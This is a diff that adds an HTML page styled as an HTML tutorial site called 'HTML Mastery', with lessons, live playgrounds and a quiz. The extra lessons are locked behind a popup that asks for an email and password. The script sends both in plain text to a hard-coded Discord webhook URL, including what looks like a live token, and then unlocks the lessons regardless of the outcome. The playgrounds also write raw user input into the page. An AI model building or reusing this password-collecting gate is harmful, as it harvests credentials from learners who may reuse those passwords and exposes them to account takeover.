@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5" />
+  <title>HTML Mastery · official</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="images/logo.png" type="image/png" />
+</head>
+<body>
+
+<div class="app">
+  <!-- header with logo -->
+  <header class="app-header">
+    <img src="images/logo.png" alt="HTML Mastery logo" class="logo" />
+    <div>
+      <h1>◈ html·mastery</h1>
+      <div class="subhead">
+        <span>from zero → interactive → official</span>
+        <span class="badge">v2 · mobile ready</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- navigation -->
+  <nav class="main-nav">
+    <a href="index.html" class="active">📘 Lessons</a>
+    <a href="about.html">ℹ️ About</a>
+  </nav>
+
+  <!-- FREE LESSON (always visible) -->
+  <div class="lesson-card free" id="lessonFree">
+    <div class="lesson-title">
+      <span>📄 structure &amp; the &lt;p&gt; tag</span>
+      <span class="lesson-tag free-tag">free</span>
+    </div>
+    <div class="lesson-body">
+      <p><strong>Every HTML document</strong> starts with <code>&lt;!DOCTYPE html&gt;</code>, then <code>&lt;html&gt;</code> (the root). Inside, <code>&lt;head&gt;</code> holds meta-information (like title), and <code>&lt;body&gt;</code> holds everything you see on the page.</p>
+      <p>The <code>&lt;p&gt;</code> tag defines a <strong>paragraph</strong>. It's a block-level element that automatically adds spacing above and below.</p>
+
+      <div class="close-tag-note">
+        <strong>✧ how to close tags:</strong> Most tags have an opening <code>&lt;p&gt;</code> and a closing <code>&lt;/p&gt;</code> (the slash <code>/</code> means "end this"). Some tags are <strong>self-closing</strong> (e.g., <code>&lt;img&gt;</code> or <code>&lt;br&gt;</code>) – they don't need a separate closing tag.
+      </div>
+
+      <div class="static-example">
+        <strong>📌 static example</strong>
+        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;My page&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;p&gt;This is a paragraph.&lt;/p&gt;
+    &lt;p&gt;Another one with a line break&lt;br&gt;right here.&lt;/p&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre>
+      </div>
+
+      <!-- LIVE PLAYGROUND for free lesson -->
+      <div class="playground">
+        <div class="playground-label">
+          ✏️ try it yourself
+          <span>edit → run</span>
+        </div>
+        <textarea id="playground_free" rows="4">&lt;p&gt;Write your own paragraph here.&lt;/p&gt;
+&lt;p&gt;Second line with a &lt;br&gt;break.&lt;/p&gt;</textarea>
+        <div class="playground-actions">
+          <button class="btn btn-primary" onclick="window.runPlayground('free')">▶ run</button>
+          <button class="btn btn-outline" onclick="window.resetPlayground('free')">↺ reset</button>
+        </div>
+        <div class="playground-output" id="output_free">
+          <!-- rendered live -->
+        </div>
+      </div>
+
+      <div class="flex" style="margin-top:1.2rem;">
+        <button class="btn btn-primary" id="unlockBtn">🔓 unlock all lessons</button>
+        <span style="color:#6a7e99; font-size:0.8rem;">(email + password)</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOCKED PLACEHOLDER (visible until unlocked) -->
+  <div class="locked-placeholder" id="lockedPlaceholder">
+    <span class="lock-icon">🔒</span>
+    <h3>5 more lessons are locked</h3>
+    <ul>
+      <li>Headings &lt;h1&gt;–&lt;h6&gt;</li>
+      <li>The &lt;div&gt; container</li>
+      <li>Anchors &lt;a&gt;</li>
+      <li>Images &lt;img&gt;</li>
+      <li>Lists &lt;ul&gt; / &lt;ol&gt;</li>
+    </ul>
+    <button class="btn btn-primary" id="unlockBtn2">🔓 unlock now</button>
+  </div>
+
+  <!-- CONTAINER FOR ALL LESSONS (hidden until unlocked) -->
+  <div id="allLessonsContainer" class="hidden">
+    <!-- lessons will be injected by JS -->
+  </div>
+
+  <!-- QUIZ SECTION (hidden until all lessons unlocked) -->
+  <div class="quiz-section hidden" id="quizSection">
+    <h2 style="font-weight:500; margin-bottom:1rem; font-size:1.3rem;">📝 quick quiz · test your knowledge</h2>
+    <div id="quizContainer"></div>
+    <div class="flex" style="margin-top: 0.8rem;">
+      <button class="btn btn-primary" id="submitQuizBtn">✅ submit & show answers</button>
+    </div>
+    <div id="quizResult" class="quiz-result" style="margin-top:0.8rem;"></div>
+  </div>
+</div>
+
+<!-- SIGNUP POPUP -->
+<div class="popup-overlay" id="signupPopup">
+  <div class="popup-box">
+    <button class="close-popup" id="closePopupBtn">✕</button>
+    <h2>🔓 unlock everything</h2>
+    <p>Enter email and password to unlock all lessons. We'll send this to the command center (Discord).</p>
+    <input type="email" id="emailInput" placeholder="your@email.com" autocomplete="email" />
+    <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="current-password" />
+    <button class="btn btn-primary" id="signupSubmitBtn">🚀 sign up & unlock</button>
+    <div id="popupStatus" style="margin-top:0.6rem; font-size:0.85rem; color:#a0b7d0;"></div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ----- config -----
+    const WEBHOOK = 'https://discord.com/api/webhooks/1541563885751107634/QDJLh9Pqix7ijuiXZSMOk5us-wRqOrklvU-sbFSMEZ91NXzCSkzcy4W6_lRDIXAA7_9D';
+
+    // ----- lesson data (full) -----
+    const lessons = [
+      { id: 1, title: '#️⃣ headings <h1>–<h6>',
+        desc: 'Headings define hierarchy. <code>&lt;h1&gt;</code> is the most important (main title), <code>&lt;h6&gt;</code> the least. They are block-level, bold, and have default margins.<br><strong>Close:</strong> <code>&lt;h1&gt;...&lt;/h1&gt;</code>',
+        example: '<h1>Main title</h1>\n<h2>Subheading</h2>\n<h3>Section</h3>',
+        starter: '<h1>My awesome title</h1>\n<h2>Subtitle</h2>\n<h3>Smaller heading</h3>' },
+      { id: 2, title: '📦 the <div> container',
+        desc: '<code>&lt;div&gt;</code> is a generic block container. It has no semantic meaning — it\'s purely for grouping elements to style or layout them.<br><strong>Close:</strong> <code>&lt;div&gt;...&lt;/div&gt;</code>',
+        example: '<div style="background:#1f2a36; padding:1rem; border-radius:12px;">\n  <p>Content inside a div</p>\n</div>',
+        starter: '<div style="background:#1f2a36; padding:1rem; border-radius:12px;">\n  <p>This is inside a div.</p>\n  <p>Add more elements here.</p>\n</div>' },
+      { id: 3, title: '🔗 anchors <a> (links)',
+        desc: 'The <code>&lt;a&gt;</code> tag creates hyperlinks. Use the <code>href</code> attribute to set the destination.<br><strong>Close:</strong> <code>&lt;a href="url"&gt;...&lt;/a&gt;</code>',
+        example: '<a href="https://example.com">Visit Example</a>',
+        starter: '<a href="https://developer.mozilla.org">MDN Web Docs</a>' },
+      { id: 4, title: '🖼️ images <img> (self-closing)',
+        desc: '<code>&lt;img&gt;</code> is <strong>self-closing</strong> — it doesn\'t have a separate closing tag. Attributes: <code>src</code> (file/URL) and <code>alt</code> (description for accessibility).<br><strong>Close:</strong> it closes itself: <code>&lt;img src="..." alt="..."&gt;</code>',
+        example: '<img src="https://via.placeholder.com/150/4a6cf7/fff?text=Image" alt="Placeholder image" style="max-width:100%;">',
+        starter: '<img src="https://via.placeholder.com/150/4a6cf7/fff?text=Try+it" alt="Custom image" style="max-width:100%;">' },
+      { id: 5, title: '📋 lists: <ul> & <ol>',
+        desc: '<code>&lt;ul&gt;</code> = unordered (bullets), <code>&lt;ol&gt;</code> = ordered (numbers). List items go inside <code>&lt;li&gt;</code>.<br><strong>Close:</strong> every tag closes: <code>&lt;ul&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;</code>',
+        example: '<ul>\n  <li>Item one</li>\n  <li>Item two</li>\n</ul>\n<ol>\n  <li>First</li>\n  <li>Second</li>\n</ol>',
+        starter: '<ul>\n  <li>Milk</li>\n  <li>Eggs</li>\n</ul>\n<ol>\n  <li>Wake up</li>\n  <li>Code</li>\n</ol>' }
+    ];
+
+    // ----- DOM refs -----
+    const unlockBtn = document.getElementById('unlockBtn');
+    const unlockBtn2 = document.getElementById('unlockBtn2');
+    const lockedPlaceholder = document.getElementById('lockedPlaceholder');
+    const allContainer = document.getElementById('allLessonsContainer');
+    const quizSection = document.getElementById('quizSection');
+    const quizContainer = document.getElementById('quizContainer');
+    const submitQuizBtn = document.getElementById('submitQuizBtn');
+    const quizResult = document.getElementById('quizResult');
+
+    const popup = document.getElementById('signupPopup');
+    const closePopupBtn = document.getElementById('closePopupBtn');
+    const signupSubmitBtn = document.getElementById('signupSubmitBtn');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const popupStatus = document.getElementById('popupStatus');
+
+    let unlocked = false;
+
+    // Helper: escape HTML so tags show as text
+    function escapeHtml(str) {
+      return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    }
+
+    // ----- playground helpers (exposed globally) -----
+    window.runPlayground = function(id) {
+      const textarea = document.getElementById(`playground_${id}`);
+      const output = document.getElementById(`output_${id}`);
+      if (textarea && output) {
+        output.innerHTML = textarea.value;
+      }
+    };
+    window.resetPlayground = function(id) {
+      const textarea = document.getElementById(`playground_${id}`);
+      if (textarea && textarea.dataset.starter) {
+        textarea.value = textarea.dataset.starter;
+        window.runPlayground(id);
+      }
+    };
+
+    // ----- render all lessons (after unlock) -----
+    function renderAllLessons() {
+      allContainer.innerHTML = '';
+      lessons.forEach((lesson, idx) => {
+        const card = document.createElement('div');
+        card.className = 'lesson-card';
+        card.style.borderLeft = '6px solid #4a6cf7';
+        const id = `lesson_${idx}`;
+        const escapedStarter = lesson.starter.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        card.innerHTML = `
+          <div class="lesson-title">
+            <span>${lesson.title}</span>
+            <span class="lesson-tag">unlocked</span>
+          </div>
+          <div class="lesson-body">
+            <p>${lesson.desc}</p>
+            <div class="static-example">
+              <strong>📌 example</strong>
+              <pre>${escapeHtml(lesson.example)}</pre>
+            </div>
+            <div class="playground">
+              <div class="playground-label">
+                ✏️ try it yourself
+                <span>edit → run</span>
+              </div>
+              <textarea id="playground_${idx}" rows="3" data-starter="${escapedStarter}">${escapeHtml(lesson.starter)}</textarea>
+              <div class="playground-actions">
+                <button class="btn btn-primary" onclick="window.runPlayground('${idx}')">▶ run</button>
+                <button class="btn btn-outline" onclick="window.resetPlayground('${idx}')">↺ reset</button>
+              </div>
+              <div class="playground-output" id="output_${idx}"></div>
+            </div>
+          </div>
+        `;
+        allContainer.appendChild(card);
+        setTimeout(() => {
+          const ta = document.getElementById(`playground_${idx}`);
+          const out = document.getElementById(`output_${idx}`);
+          if (ta && out) {
+            out.innerHTML = ta.value;
+          }
+        }, 20);
+      });
+    }
+
+    // ----- unlock everything -----
+    function unlockEverything() {
+      if (unlocked) return;
+      unlocked = true;
+      lockedPlaceholder.style.display = 'none';
+      allContainer.classList.remove('hidden');
+      renderAllLessons();
+      quizSection.classList.remove('hidden');
+      renderQuiz();
+      [unlockBtn, unlockBtn2].forEach(b => {
+        b.textContent = '✅ unlocked';
+        b.disabled = true;
+        b.style.opacity = '0.6';
+        b.style.pointerEvents = 'none';
+      });
+    }
+
+    // ----- quiz -----
+    const quizData = [
+      { q: 'Which tag defines a paragraph?', options: ['<p>', '<para>', '<text>', '<body>'], correct: 0 },
+      { q: 'What is the largest heading tag?', options: ['<h1>', '<h6>', '<head>', '<heading>'], correct: 0 },
+      { q: 'Which tag is self-closing?', options: ['<div>', '<img>', '<a>', '<p>'], correct: 1 },
+      { q: 'What does <div> represent?', options: ['generic container', 'paragraph', 'heading', 'list'], correct: 0 },
+      { q: 'Which tag creates an unordered list?', options: ['<ul>', '<ol>', '<li>', '<list>'], correct: 0 }
+    ];
+
+    function renderQuiz() {
+      quizContainer.innerHTML = '';
+      quizData.forEach((item, idx) => {
+        const div = document.createElement('div');
+        div.className = 'quiz-question';
+        div.dataset.qidx = idx;
+        const p = document.createElement('p');
+        p.textContent = `${idx+1}. ${item.q}`;
+        div.appendChild(p);
+        const optDiv = document.createElement('div');
+        optDiv.className = 'quiz-options';
+        item.options.forEach((opt, optIdx) => {
+          const label = document.createElement('label');
+          const radio = document.createElement('input');
+          radio.type = 'radio';
+          radio.name = `q${idx}`;
+          radio.value = optIdx;
+          label.appendChild(radio);
+          label.appendChild(document.createTextNode(' ' + opt));
+          optDiv.appendChild(label);
+        });
+        div.appendChild(optDiv);
+        quizContainer.appendChild(div);
+      });
+      quizResult.textContent = '';
+    }
+
+    submitQuizBtn.addEventListener('click', () => {
+      let correct = 0;
+      const questions = quizContainer.querySelectorAll('.quiz-question');
+      questions.forEach((div, idx) => {
+        const selected = div.querySelector('input[type="radio"]:checked');
+        const userAns = selected ? parseInt(selected.value) : -1;
+        const correctAns = quizData[idx].correct;
+        const optionLabels = div.querySelectorAll('.quiz-options label');
+        optionLabels.forEach(lb => {
+          lb.classList.remove('correct', 'wrong', 'show-correct');
+        });
+        optionLabels[correctAns].classList.add('show-correct');
+        if (userAns === correctAns) {
+          correct++;
+          if (userAns !== -1) optionLabels[userAns].classList.add('correct');
+        } else if (userAns !== -1) {
+          optionLabels[userAns].classList.add('wrong');
+        }
+      });
+      const total = quizData.length;
+      quizResult.innerHTML = `🎯 ${correct} / ${total} correct. ${correct === total ? '🌟 perfect — you\'re ready!' : '👀 review the highlighted answers (green = correct).'}`;
+    });
+
+    // ----- discord webhook + unlock -----
+    function sendAndUnlock(email, password) {
+      const payload = { content: `📩 **new sign-up**\nemail: ${email}\npassword: ${password}` };
+      fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).then(res => {
+        popupStatus.textContent = res.ok ? '✅ sent! unlocking...' : '⚠️ webhook error, but unlocking anyway.';
+        setTimeout(() => {
+          popup.classList.remove('active');
+          unlockEverything();
+          popupStatus.textContent = '';
+          emailInput.value = '';
+          passwordInput.value = '';
+        }, 500);
+      }).catch(() => {
+        popupStatus.textContent = '⚠️ network issue, but unlocking anyway.';
+        setTimeout(() => {
+          popup.classList.remove('active');
+          unlockEverything();
+          popupStatus.textContent = '';
+          emailInput.value = '';
+          passwordInput.value = '';
+        }, 600);
+      });
+    }
+
+    // ----- popup controls -----
+    function openPopup() { popup.classList.add('active'); popupStatus.textContent = ''; }
+    function closePopup() { popup.classList.remove('active'); popupStatus.textContent = ''; }
+    [unlockBtn, unlockBtn2].forEach(b => b.addEventListener('click', openPopup));
+    closePopupBtn.addEventListener('click', closePopup);
+    popup.addEventListener('click', (e) => { if (e.target === popup) closePopup(); });
+
+    signupSubmitBtn.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      if (!email || !password) { popupStatus.textContent = '⚠️ both fields required.'; return; }
+      if (!email.includes('@')) { popupStatus.textContent = '⚠️ valid email required.'; return; }
+      sendAndUnlock(email, password);
+    });
+    [emailInput, passwordInput].forEach(inp => inp.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') signupSubmitBtn.click();
+    }));
+
+    // ----- init free playground -----
+    setTimeout(() => {
+      const out = document.getElementById('output_free');
+      const ta = document.getElementById('playground_free');
+      if (out && ta) {
+        out.innerHTML = ta.value;
+        if (!ta.dataset.starter) ta.dataset.starter = ta.value;
+      }
+    }, 30);
+  })();
+</script>
+</body>
+</html>
